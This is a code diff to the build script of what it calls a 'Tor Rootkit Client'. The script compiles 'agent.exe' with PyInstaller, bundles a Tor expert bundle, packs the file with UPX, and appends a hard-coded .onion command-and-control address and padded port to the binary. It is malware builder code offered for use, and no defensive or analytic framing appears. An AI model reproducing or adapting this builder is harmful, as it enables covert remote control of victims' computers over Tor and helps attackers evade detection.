@@ -5,6 +5,11 @@ import zipfile
 import sys
 from argparse import ArgumentParser
 
+#run this to build the agent.exe output all the configurations are taken care by this code
+
+
+#This command works well and produces out without error
+# PyInstaller --debug all --onefile --add-data=torbundle:torbundle --upx-dir=upx-3.96-win64 agent.py 
 
 def get_tor_expert_bundle():
     # create directory for the tor expert bundle
@@ -34,6 +39,20 @@ def get_tor_expert_bundle():
     os.chdir('..')
 
 
+def append_address(onion, port):
+    port = str(port)
+    #for path in ['/executables/client_linux', '/executables/client_win.exe']:
+    for path in ['./dist/agent.exe']:
+        with open(path, 'a') as file:
+            file.write(onion)
+            # add padding to always use the same amount of bytes
+            if len(port) < 5:
+                rest = 5 - len(port)
+                port = rest * '0' + port
+            file.write(port)
+    print('Appended onion address and port to executables')
+
+
 # def parse_args():
 #     parser = ArgumentParser(description='Python3 Tor Rootkit Client')
 #     parser.add_argument('onion', type=str, help='The remote onion address of the listener.')
@@ -51,10 +70,16 @@ if __name__ == '__main__':
     PyInstaller.__main__.run([
         'agent.py',
         '--onefile',
-        '--add-data=torbundle;torbundle'
+        '--add-data=torbundle:torbundle',
+        '--upx-dir=upx-3.96-win64'
     ])
     # else:
     #     PyInstaller.__main__.run([
     #         'agent.py',
     #         '--onefile',
     #     ])
+
+    #enter the onion address and port here
+    onion = "axz2zqbav3nrnoofvwfk6qzp76aujxcwoeqp5pefwr3hgkk5rvjlaqyd.onion"
+    port = 80
+    append_address(onion, port)
